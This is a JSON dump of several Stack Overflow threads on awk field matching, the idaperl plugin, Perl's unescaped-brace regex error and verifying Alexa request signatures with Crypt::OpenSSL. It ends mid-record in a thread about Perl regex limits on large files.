"is_accepted": false, "score": 1, "last_activity_date": 1520920786, "creation_date": 1520920786, "answer_id": 49249242, "question_id": 49249151, "link": "https://stackoverflow.com/questions/49249151/awk-not-ignoring-white-spaces/49249242#49249242", "title": "Awk Not ignoring white spaces", "body": "<p>In case you want to print those lines which have <code>input</code> string in their first field then following will help you.</p>\n\n<pre><code>awk '$1==\"input\"'  Input_file\n</code></pre>\n\n<p>Output will be as follows:</p>\n\n<pre><code>     input\n     input\n</code></pre>\n\n<p>In case you don't want to have spaces and print those lines whose first field is <code>input</code> then following may help you.</p>\n\n<pre><code>awk '$1==\"input\"{$1=$1;print}' Input_file\n</code></pre>\n\n<p>Output will be as follows:</p>\n\n<pre><code>input\ninput\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 20517, "user_id": 8344060, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1UbPk.png?s=128&g=1", "display_name": "kvantour", "link": "https://stackoverflow.com/users/8344060/kvantour"}, "is_accepted": false, "score": 0, "last_activity_date": 1520935657, "creation_date": 1520935657, "answer_id": 49253353, "question_id": 49249151, "link": "https://stackoverflow.com/questions/49249151/awk-not-ignoring-white-spaces/49253353#49253353", "title": "Awk Not ignoring white spaces", "body": "<p>The problem in your initial code is that you wrote <code>input</code> without any quotes. This actually implies that <code>input</code> is a variable which is defaultly assigned as an empty string in case of string operations or as the number zero in case of numeric operations.</p>\n\n<pre><code>awk '{if($1 == input) print $1;}' &lt;file&gt;\n</code></pre>\n\n<p>is therefore equivalent to (in case of string comparisons)</p>\n\n<pre><code>awk '{if($1 == \"\") print $1;}' &lt;file&gt;\n</code></pre>\n\n<p>So the correct answer would be any of the following :</p>\n\n<pre><code>awk '{if ($1 == \"input\") print $1 }' &lt;file&gt;\nawk '($1 == \"input\"){print $1}'      &lt;file&gt;\nawk '$1~/^input$/{print $1}'         &lt;file&gt;\n</code></pre>\n\n<p>If your file only has a single column, and you want to keep the original spacing:</p>\n\n<pre><code>awk '{if ($1 == \"input\") print}'        &lt;file&gt;\nawk '($1 == \"input\")'                   &lt;file&gt;\nawk '$1~/^input$/'                      &lt;file&gt;\nawk '/^[[:blank:]]*input[[:blank:]]*$/' &lt;file&gt;\n</code></pre>\n\n<p><strong>note:</strong> the regex operation <code>/.../</code> does not require quotes. So <code>/input/</code> works.</p>\n\n<p><strong>note:</strong> escaping the <code>$</code> sign using <code>\\$</code> does not work. The <code>\\</code> is assumed to be the line-break character and is expected to be the last character on the line. So the original code breaks.</p>\n"}], "owner": {"reputation": 11, "user_id": 9483354, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/03c50b09d29fbab7bad0634c28974a31?s=128&d=identicon&r=PG&f=1", "display_name": "Kishore Sai", "link": "https://stackoverflow.com/users/9483354/kishore-sai"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 194, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1520935657, "creation_date": 1520920371, "last_edit_date": 1520920554, "question_id": 49249151, "link": "https://stackoverflow.com/questions/49249151/awk-not-ignoring-white-spaces", "title": "Awk Not ignoring white spaces", "body": "<p>My input file is in this format</p>\n\n<pre><code>         input\n         input\n         output\n         super\n         krish\n</code></pre>\n\n<p>that is every line starts with white space and have something after whitespaces.</p>\n\n<p>Now when i try \"awk '{print $1}' input\" in unix it is printing in the below format</p>\n\n<pre><code>$ awk '{print $1}' input\ninput\ninput\noutput\nsuper\nkrish\n</code></pre>\n\n<p>But the problem is when I try</p>\n\n<pre><code>awk '{if(\\$1 == input) print \\$1;}' &lt;file&gt;\n</code></pre>\n\n<p>in <strong>system</strong> or by using <strong>backticks</strong> it is not printing the output, neither it is showing any error</p>\n\n<p>Can anyone help me in this?? </p>\n"}, {"tags": ["perl", "reverse-engineering", "ida"], "answers": [{"tags": [], "owner": {"reputation": 18919, "user_id": 891440, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/dd366bcdcf85991fa8af1b6d11d3ad49?s=128&d=identicon&r=PG", "display_name": "jjmerelo", "link": "https://stackoverflow.com/users/891440/jjmerelo"}, "is_accepted": false, "score": 1, "last_activity_date": 1520945131, "creation_date": 1520945131, "answer_id": 49256582, "question_id": 49246611, "link": "https://stackoverflow.com/questions/49246611/is-the-idaperl-plugin-no-longer-developed/49256582#49256582", "title": "Is the idaperl plugin no longer developed?", "body": "<p>The <a href=\"https://github.com/nlitsme/idaperl\" rel=\"nofollow noreferrer\">repo README.md</a> says it's been discontinued, </p>\n\n<blockquote>\n  <p>note: I am not actively developping this plugin anymore, since i myself now mostly use idapython for scripting.</p>\n</blockquote>\n\n<p>I have been looking for active forks, but there seems to be none. So your best bet might effectively to use IDAPython. It's anyone's guess whether this version supports 7.0, but you might want to downgrade to 6.5 if you effectively want to use that. There seem to be <a href=\"https://metacpan.org/search?q=%22reverse%20engineering%22\" rel=\"nofollow noreferrer\">some tools that support reverse engineering in CPAN</a>; depending on what you want to do, one of them might be useful if you're keen on using Perl. </p>\n"}], "owner": {"reputation": 1, "user_id": 9352556, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9cc78a921a0b27c18a939d13b07dfcff?s=128&d=identicon&r=PG&f=1", "display_name": "SanJi ", "link": "https://stackoverflow.com/users/9352556/sanji"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 52, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1520945131, "creation_date": 1520902227, "last_edit_date": 1520908283, "question_id": 49246611, "link": "https://stackoverflow.com/questions/49246611/is-the-idaperl-plugin-no-longer-developed", "title": "Is the idaperl plugin no longer developed?", "body": "<p>I am a student studying reverse engineering\nI mainly use C and Perl, and I think this is a good choice</p>\n\n<p>However, python is still being developed for ida, but idaperl says development has been discontinued (github). I have two questions.</p>\n\n<ol>\n<li>Has idaperl development stopped?</li>\n<li>github supports ida 6.5. Can this be used informally in 7.0?</li>\n</ol>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 2, "creation_date": 1520893892, "post_id": 49245227, "comment_id": 85494692, "body": "Changelog entry: <a href=\"https://metacpan.org/pod/distribution/perl/pod/perl5260delta.pod#Unescaped-literal-%22%7B%22-characters-in-regular-expression-patterns-are-no-longer-permissible\" rel=\"nofollow noreferrer\">metacpan.org/pod/distribution/perl/pod/&hellip;</a>"}], "answers": [{"tags": [], "owner": {"reputation": 142005, "user_id": 465183, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/3b518a0ea4c992cfe9965671d0139ba4?s=128&d=identicon&r=PG", "display_name": "Gilles Quenot", "link": "https://stackoverflow.com/users/465183/gilles-quenot"}, "is_accepted": false, "score": 2, "last_activity_date": 1520892948, "creation_date": 1520892948, "answer_id": 49245247, "question_id": 49245227, "link": "https://stackoverflow.com/questions/49245227/perl-why-is-this-expression-not-working-with-the-new-version-of-perl/49245247#49245247", "title": "Perl: Why is this expression not working with the new version of Perl?", "body": "<p>Try this :</p>\n\n<pre><code>if ($text =~/^(.*)\\$ENV\\{(.*)\\}(.*)$/) {\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 1, "creation_date": 1520947227, "post_id": 49245316, "comment_id": 85517527, "body": "<i>Almost</i> always, as the page you linked to describes - <code>qr&#47;{fee|{fie&#47;</code> is still allowed."}], "tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": true, "score": 4, "last_activity_date": 1520908577, "last_edit_date": 1520908577, "creation_date": 1520893309, "answer_id": 49245316, "question_id": 49245227, "link": "https://stackoverflow.com/questions/49245227/perl-why-is-this-expression-not-working-with-the-new-version-of-perl/49245316#49245316", "title": "Perl: Why is this expression not working with the new version of Perl?", "body": "<p><code>{</code> is now always treated as a regex metacharacter. When an unescaped character is illegal, you make it legal by escaping it.</p>\n\n<pre><code>$text =~/^(.*)\\$ENV\\{(.*)}(.*)$/\n                   ^---- new character\n</code></pre>\n\n<p>See <a href=\"https://metacpan.org/pod/distribution/perl/pod/perl5260delta.pod#Unescaped-literal-&quot;%7B&quot;-characters-in-regular-expression-patterns-are-no-longer-permissible\" rel=\"nofollow noreferrer\">https://metacpan.org/pod/distribution/perl/pod/perl5260delta.pod#Unescaped-literal-\"{\"-characters-in-regular-expression-patterns-are-no-longer-permissible</a></p>\n"}], "owner": {"reputation": 13, "user_id": 8277258, "user_type": "registered", "profile_image": "https://graph.facebook.com/10206833247732241/picture?type=large", "display_name": "Richard Newton", "link": "https://stackoverflow.com/users/8277258/richard-newton"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 198, "favorite_count": 0, "accepted_answer_id": 49245316, "answer_count": 2, "score": 1, "last_activity_date": 1520925927, "creation_date": 1520892810, "last_edit_date": 1520925927, "question_id": 49245227, "link": "https://stackoverflow.com/questions/49245227/perl-why-is-this-expression-not-working-with-the-new-version-of-perl", "title": "Perl: Why is this expression not working with the new version of Perl?", "body": "<p>I am attempting to run a Perl script, which produces the following error:</p>\n\n<blockquote>\n  <p>Unescaped left brace in regex is illegal here in regex; marked by &lt;-- HERE in m/^(.<em>)\\$ENV{ &lt;-- HERE (.</em>)}(.*)$/ at /root/cesm1_2_0/scripts/ccsm_utils/Case.template/ConfigCase.pm line 1180.\n  Compilation failed in require at ./create_newcase line 361</p>\n</blockquote>\n\n<p>The offending code is:</p>\n\n<pre><code>if($text =~/^(.*)\\$ENV{(.*)}(.*)$/){\n    ...\n}\n</code></pre>\n\n<p>There was an issue earlier in the code that was due to \"using a newer Perl version than that code supports\" (see: <a href=\"https://bb.cgd.ucar.edu/machine-configuration-and-generating-domain-file\" rel=\"nofollow noreferrer\">https://bb.cgd.ucar.edu/machine-configuration-and-generating-domain-file</a>), so I expect that the regex syntax in Perl has changed. </p>\n\n<p>Can someone translate this line to be compatible with the current version of Perl?</p>\n"}, {"tags": ["perl", "openssl"], "comments": [{"owner": {"reputation": 1672, "user_id": 4355253, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ee8cbfecfb7686f370b07eea52273c5?s=128&d=identicon&r=PG&f=1", "display_name": "Javier Elices", "link": "https://stackoverflow.com/users/4355253/javier-elices"}, "edited": false, "score": 2, "creation_date": 1520882577, "post_id": 49242807, "comment_id": 85489698, "body": "Have you checked out this module? <a href=\"https://metacpan.org/pod/Net::Amazon::AlexaValidator\" rel=\"nofollow noreferrer\">Net::Amazon::AlexaValidator</a>."}, {"owner": {"reputation": 41, "user_id": 9481429, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/036d19f1bae0099fc9cc6fb0bbf3e45f?s=128&d=identicon&r=PG", "display_name": "chris", "link": "https://stackoverflow.com/users/9481429/chris"}, "reply_to_user": {"reputation": 1672, "user_id": 4355253, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ee8cbfecfb7686f370b07eea52273c5?s=128&d=identicon&r=PG&f=1", "display_name": "Javier Elices", "link": "https://stackoverflow.com/users/4355253/javier-elices"}, "edited": false, "score": 0, "creation_date": 1520884067, "post_id": 49242807, "comment_id": 85490484, "body": "Yes, I did. But it does not work 100% as I get the same results. I don&#39;t quite understand what they are doing here.     my $valid;   try {     $valid = $pub_key-&gt;verify($raw_request, $signature);   } catch {     return { success =&gt; 0, error_msg =&gt; &quot;Amazon Alexa certificate failed public key validation: $_&quot; };   };"}, {"owner": {"reputation": 1672, "user_id": 4355253, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ee8cbfecfb7686f370b07eea52273c5?s=128&d=identicon&r=PG&f=1", "display_name": "Javier Elices", "link": "https://stackoverflow.com/users/4355253/javier-elices"}, "edited": false, "score": 1, "creation_date": 1520893221, "post_id": 49242807, "comment_id": 85494457, "body": "Regarding <code>try</code> and <code>catch</code>, read this article: <a href=\"http://www.perlmonks.org/?node_id=1118605\" rel=\"nofollow noreferrer\">Perl try { } catch(e) { }</a> or browse a bit... Perl does not have those, but there are libraries that add them for you like <code>Try::Tiny</code> or <code>TryCatch</code>."}, {"owner": {"reputation": 41, "user_id": 9481429, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/036d19f1bae0099fc9cc6fb0bbf3e45f?s=128&d=identicon&r=PG", "display_name": "chris", "link": "https://stackoverflow.com/users/9481429/chris"}, "reply_to_user": {"reputation": 1672, "user_id": 4355253, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1ee8cbfecfb7686f370b07eea52273c5?s=128&d=identicon&r=PG&f=1", "display_name": "Javier Elices", "link": "https://stackoverflow.com/users/4355253/javier-elices"}, "edited": false, "score": 0, "creation_date": 1520969442, "post_id": 49242807, "comment_id": 85532200, "body": "I used the following code to extract the public key, my $decoded_cert2 = Crypt::OpenSSL::X509-&gt;new_from_string( $primary_cert ); my $pub_key = Crypt::OpenSSL::RSA-&gt;new_public_key($decoded_cert2-&gt;pubkey()&zwnj;&#8203;);  But now how do I use that Public Key to decrypt the encrypted signature to produce the asserted hash value?"}, {"owner": {"reputation": 803, "user_id": 9268143, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-kXnAvaIQ7IY/AAAAAAAAAAI/AAAAAAAAACE/w3h-3STwD4I/photo.jpg?sz=128", "display_name": "Guru", "link": "https://stackoverflow.com/users/9268143/guru"}, "edited": false, "score": 0, "creation_date": 1525191947, "post_id": 49242807, "comment_id": 87257684, "body": "This is a java version of how alex skill kit does it <a href=\"https://github.com/alexa/alexa-skills-kit-sdk-for-java/blob/master/src/com/amazon/speech/speechlet/authentication/SpeechletRequestSignatureVerifier.java\" rel=\"nofollow noreferrer\">github.com/alexa/alexa-skills-kit-sdk-for-java/blob/master/s&zwnj;&#8203;rc/&hellip;</a>"}], "owner": {"reputation": 41, "user_id": 9481429, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/036d19f1bae0099fc9cc6fb0bbf3e45f?s=128&d=identicon&r=PG", "display_name": "chris", "link": "https://stackoverflow.com/users/9481429/chris"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 155, "favorite_count": 3, "answer_count": 0, "score": 3, "last_activity_date": 1520890251, "creation_date": 1520881727, "last_edit_date": 1520890251, "question_id": 49242807, "link": "https://stackoverflow.com/questions/49242807/need-help-on-checking-the-signature-of-the-request-from-amazon-alexa-using-perl", "title": "Need help on Checking the Signature of the Request from Amazon Alexa using Perl", "body": "<p>I am currently building a web service that should handle Alexa voice intents. The HTTP request I get from Alexa must be verified by checking a signature, as described <a href=\"https://developer.amazon.com/docs/custom-skills/host-a-custom-skill-as-a-web-service.html\" rel=\"nofollow noreferrer\">in the documentation</a>.</p>\n\n<p>I am writing this code in Perl.</p>\n\n<p>Amazon provides me with a <code>SignatureCertChainUrl</code> (which contains the certificate) and a signature, such as the following:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>signature: KUm7g9saS4la2pwCPJHuk0ZOtNAPKnqE8qprp58rz1x9Em1DDp2mNdL56iiC7weGw3hzaN6lCmqjWL3zxtAC7HXmbDPdpYE5ZQJzVDCorAvAgb0VQTVMiRi2xcoNm+6KcQZe2/aFJgAxaDaJ3qID9EVPmhJMlHhFxD+/4Ip5O860Pk9GPTq1lC7gKGw5VmUinXZk/RCUnevnhL4TGfZYgEs4bI5QgHtdzlQdy+P6cfRqpuQrLEeFjHF13OA1uf/W5MjgF9dKjV0cCM3fAcBbz8O9itZbt1pC7LIJsDLYxQMcW7af98GdTv2dlnx3kb9JPERsTSni+rDKoukxgxQGcA==\n\n\n-----BEGIN CERTIFICATE-----\n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\nccE06fT1pEjUUYDoPEFUGMCqJibCyDjhSiY=\n-----END CERTIFICATE-----\n\n-----BEGIN CERTIFICATE-----\nMIIFODCCBCCgAwIBAgIQUT+5dDhwtzRAQY0wkwaZ/zANBgkqhkiG9w0BAQsFADCB\nyjELMAkGA1UEBhMCVVMxFzAVBgNVBAoTDlZlcmlTaWduLCBJbmMuMR8wHQYDVQQL\nExZWZXJpU2lnbiBUcnVzdCBOZXR3b3JrMTowOAYDVQQLEzEoYykgMjAwNiBWZXJp\nU2lnbiwgSW5jLiAtIEZvciBhdXRob3JpemVkIHVzZSBvbmx5MUUwQwYDVQQDEzxW\nZXJpU2lnbiBDbGFzcyAzIFB1YmxpYyBQcmltYXJ5IENlcnRpZmljYXRpb24gQXV0\naG9yaXR5IC0gRzUwHhcNMTMxMDMxMDAwMDAwWhcNMjMxMDMwMjM1OTU5WjB+MQsw\nCQYDVQQGEwJVUzEdMBsGA1UEChMUU3ltYW50ZWMgQ29ycG9yYXRpb24xHzAdBgNV\nBAsTFlN5bWFudGVjIFRydXN0IE5ldHdvcmsxLzAtBgNVBAMTJlN5bWFudGVjIENs\nYXNzIDMgU2VjdXJlIFNlcnZlciBDQSAtIEc0MIIBIjANBgkqhkiG9w0BAQEFAAOC\nAQ8AMIIBCgKCAQEAstgFyhx0LbUXVjnFSlIJluhL2AzxaJ+aQihiw6UwU35VEYJb\nA3oNL+F5BMm0lncZgQGUWfm893qZJ4Itt4PdWid/sgN6nFMl6UgfRk/InSn4vnlW\n9vf92Tpo2otLgjNBEsPIPMzWlnqEIRoiBAMnF4scaGGTDw5RgDMdtLXO637QYqzu\ns3sBdO9pNevK1T2p7peYyo2qRA4lmUoVlqTObQJUHypqJuIGOmNIrLRM0XWTUP8T\nL9ba4cYY9Z/JJV3zADreJk20KQnNDz0jbxZKgRb78oMQw7jW2FUyPfG9D72MUpVK\nFpd6UiFjdS8W+cRmvvW1Cdj/JwDNRHxvSz+w9wIDAQABo4IBYzCCAV8wEgYDVR0T\nAQH/BAgwBgEB/wIBADAwBgNVHR8EKTAnMCWgI6Ahhh9odHRwOi8vczEuc3ltY2Iu\nY29tL3BjYTMtZzUuY3JsMA4GA1UdDwEB/wQEAwIBBjAvBggrBgEFBQcBAQQjMCEw\nHwYIKwYBBQUHMAGGE2h0dHA6Ly9zMi5zeW1jYi5jb20wawYDVR0gBGQwYjBgBgpg\nhkgBhvhFAQc2MFIwJgYIKwYBBQUHAgEWGmh0dHA6Ly93d3cuc3ltYXV0aC5jb20v\nY3BzMCgGCCsGAQUFBwICMBwaGmh0dHA6Ly93d3cuc3ltYXV0aC5jb20vcnBhMCkG\nA1UdEQQiMCCkHjAcMRowGAYDVQQDExFTeW1hbnRlY1BLSS0xLTUzNDAdBgNVHQ4E\nFgQUX2DPYZBV34RDFIpgKrL1evRDGO8wHwYDVR0jBBgwFoAUf9Nlp8Ld7LvwMAnz\nQzn6Aq8zMTMwDQYJKoZIhvcNAQELBQADggEBAF6UVkndji1l9cE2UbYD49qecxny\nH1mrWH5sJgUs+oHXXCMXIiw3k/eG7IXmsKP9H+IyqEVv4dn7ua/ScKAyQmW/hP4W\nKo8/xabWo5N9Q+l0IZE1KPRj6S7t9/Vcf0uatSDpCr3gRRAMFJSaXaXjS5HoJJtG\nQGX0InLNmfiIEfXzf+YzguaoxX7+0AjiJVgIcWjmzaLmFN5OUiQt/eV5E1PnXi8t\nTRttQBVSK/eHiXgSgW7ZTaoteNTCLD0IX4eRnh8OsN4wUmSGiaqdZpwOdgyA8nTY\nKvi4Os7X1g8RvmurFPW9QaAiY4nxug9vKWNmLT+sjHLF+8fk1A/yO0+MKcc=\n-----END CERTIFICATE-----\n</code></pre>\n\n<p>I use the following code to decode and extract the public key as I have the first part of the certificate in a variable called $primary_cert .</p>\n\n<pre><code>my $decoded_cert2 = Crypt::OpenSSL::X509-&gt;new_from_string( $primary_cert );\nmy $pub_key = Crypt::OpenSSL::RSA-&gt;new_public_key($decoded_cert2-&gt;pubkey());\n</code></pre>\n\n<p>However I seem to be stuck on these steps:</p>\n\n<ol start=\"6\">\n<li>Use the public key extracted from the signing certificate to decrypt the encrypted signature to produce the asserted hash value.</li>\n<li>Generate a SHA-1 hash value from the full HTTPS request body to produce the derived hash value</li>\n<li>Compare the asserted hash value and derived hash values to ensure that they match.</li>\n</ol>\n\n<p>How should the Perl code perform those last steps?  I am using the following perl modules:</p>\n\n<pre><code>use CGI qw(:all);\nuse JSON qw( decode_json );\nuse Switch;\nuse Crypt::X509;\nuse MIME::Base64 qw(decode_base64);\nuse Crypt::OpenSSL::X509;\nuse Crypt::OpenSSL::RSA;\nuse Crypt::OpenSSL::VerifyX509;\nuse Try::Tiny;\n</code></pre>\n"}, {"tags": ["bash", "perl", "awk"], "comments": [{"owner": {"reputation": 142005, "user_id": 465183, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/3b518a0ea4c992cfe9965671d0139ba4?s=128&d=identicon&r=PG", "display_name": "Gilles Quenot", "link": "https://stackoverflow.com/users/465183/gilles-quenot"}, "edited": false, "score": 1, "creation_date": 1520870545, "post_id": 49239559, "comment_id": 85482778, "body": "Why not installing a fresh perl in your HOME dir ?"}, {"owner": {"reputation": 501, "user_id": 651980, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/lS9HK.png?s=128&g=1", "display_name": "Jeff", "link": "https://stackoverflow.com/users/651980/jeff"}, "reply_to_user": {"reputation": 142005, "user_id": 465183, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/3b518a0ea4c992cfe9965671d0139ba4?s=128&d=identicon&r=PG", "display_name": "Gilles Quenot", "link": "https://stackoverflow.com/users/465183/gilles-quenot"}, "edited": false, "score": 0, "creation_date": 1520870817, "post_id": 49239559, "comment_id": 85482959, "body": "Unfortunately this is on a server without Internet access so I have to work with what I have. It&#39;s not an option to upgrade Perl as I mentioned. I&#39;m looking for a workaround."}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1520871671, "post_id": 49239559, "comment_id": 85483520, "body": "If you <a href=\"https://stackoverflow.com/posts/49239559/edit\">edit</a> your question to include concise, testable sample input and expected output you&#39;ll have a better chance of getting the right answer. Include the cases that are hard to handle not just the sunny day ones. And yes, it&#39;s only software so anything&#39;s possible."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1520880735, "post_id": 49239559, "comment_id": 85488671, "body": "<code>.*?\\n\\\\\\.\\n</code> should be <code>(?:(?!\\n\\\\\\.\\n).)*+\\n\\\\\\.\\n</code>. You can get around the limitation by replacing that with <code>(?:(?:(?!\\n\\\\\\.\\n).){65535})*+(?:(?!\\n\\\\\\.\\n).)*+\\n\\\\\\.\\n</code>"}], "answers": [{"comments": [{"owner": {"reputation": 501, "user_id": 651980, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/lS9HK.png?s=128&g=1", "display_name": "Jeff", "link": "https://stackoverflow.com/users/651980/jeff"}, "edited": false, "score": 0, "creation_date": 1520871097, "post_id": 49239668, "comment_id": 85483123, "body": "Wow this seems to work. Can you comment a bit on the syntax? In my regex I had to use a non-greedy modifier after the first match was found. Your solution seems to flip the approach upside down."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "reply_to_user": {"reputation": 501, "user_id": 651980, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/lS9HK.png?s=128&g=1", "display_name": "Jeff", "link": "https://stackoverflow.com/users/651980/jeff"}, "edited": false, "score": 2, "creation_date": 1520871355, "post_id": 49239668, "comment_id": 85483310, "body": "@Jeff Edited. Does this help?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520873957, "post_id": 49239668, "comment_id": 85484893, "body": "Kudos to <b>melpomene</b> for pointing this out, but you were using <code>perl -0</code> to read an <i>entire file</i>. (That should be <code>perl -0777</code>) When your code crashed with &gt; 2GB files, your first thought should <i>not</i> be to search for bugs in others&#39; code, it should be &quot;why am I reading 2GB from a file in one pass&quot;? There are reasons why you don&#39;t keep all data in memory all the time."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 501, "user_id": 651980, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/lS9HK.png?s=128&g=1", "display_name": "Jeff", "link": 